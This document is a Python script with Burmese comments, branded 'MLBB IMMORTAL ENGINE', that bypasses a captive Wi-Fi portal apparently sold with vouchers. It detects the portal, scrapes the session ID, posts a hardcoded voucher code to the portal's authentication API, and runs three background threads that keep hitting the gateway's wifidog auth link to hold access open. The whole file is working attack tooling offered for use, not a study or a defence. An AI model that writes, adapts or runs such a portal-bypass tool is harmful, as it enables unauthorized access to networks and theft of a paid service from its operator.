import requests, re, urllib3, time, threading, os, socket, ssl
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ဂိမ်းဆော့နေတုန်း Starlink Firewall က လှည့်မစစ်နိုင်အောင် High-End Header သုံးမည်
GAME_UA = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"

def banner():
    os.system('clear')
    print("\033[92m" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[96m   ⚔️  MLBB IMMORTAL ENGINE v12.0 (NO-VPN)  ⚔️")
    print("\033[93m   STATUS: READY TO BYPASS STARLINK")
    print("\033[92m" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def immortal_pulse(auth_link, session):
    """ 
    Ping 999ms မတက်အောင် ၀.၃ စက္ကန့်တစ်ခါ တံခါးကို အတင်းဆွဲဟထားမည်။ 
    ဒါက ပိုင်ရှင်ပေးတဲ့ ကုဒ်ထက် အဆပေါင်းများစွာ ပိုမြန်ပါတယ်။
    """
    while True:
        try:
            # တံခါးဖွင့်ထားရန် Pulse ပို့ခြင်း
            session.get(auth_link, timeout=3, headers={"User-Agent": GAME_UA})
            # ဂိမ်းဆော့နေစဉ် DNS ပိတ်မသွားအောင် Socket Punching လုပ်ခြင်း
            socket.gethostbyname("1.1.1.1")
            time.sleep(0.3) 
        except:
            time.sleep(1)

def start_engine():
    banner()
    main_session = requests.Session()
    
    while True:
        try:
            print("\033[94m[*] Scanning for Starlink Portal...\033[0m")
            # Starlink Portal ရှိမရှိ စစ်ဆေးခြင်း
            r = main_session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
            
            if r.status_code != 204:
                print("\033[93m[!] Portal Found! Bypassing now...\033[0m")
                p_url = r.url
                r1 = main_session.get(p_url, timeout=5)
                # Redirect URL ရှာဖွေခြင်း
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                n_url = urljoin(p_url, match.group(1)) if match else p_url
                
                r2 = main_session.get(n_url, timeout=5)
                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

                if sid:
                    p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                    # Voucher 123456 နဲ့ အတင်းဝင်ခြင်း
                    main_session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid}, timeout=5)
                    
                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"

                    print("\033[92m[✓] BYPASS SUCCESS! PING STABILIZED.\033[0m")
                    # Background မှာ Thread ၃ ခုနဲ့ အလုပ်လုပ်ခိုင်းမည် (Ping ငြိမ်ဖို့ အဓိက)
                    for _ in range(3):
                        threading.Thread(target=immortal_pulse, args=(auth_link, main_session), daemon=True).start()
            
            # Starlink က နောက်တစ်ခါ ပြန်မပိတ်အောင် ၁၀ စက္ကန့်တစ်ခါ ပြန်စစ်မည်
            time.sleep(10)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_engine()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Engine Stopped.\033[0m")
